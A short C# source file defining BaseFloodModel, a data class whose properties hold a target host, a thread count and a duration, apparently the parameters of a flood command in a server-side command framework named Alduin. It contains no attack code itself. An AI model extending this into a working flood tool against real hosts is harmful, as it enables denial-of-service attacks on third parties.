using System;
using System.Collections.Generic;
using System.Text;

namespace Alduin.Server.Commands
{
    public class BaseFloodModel
    {
        public string Host { get; set; }
        public int ThreadstoUse { get; set; }
        public int Time { get; set; }
    }
}
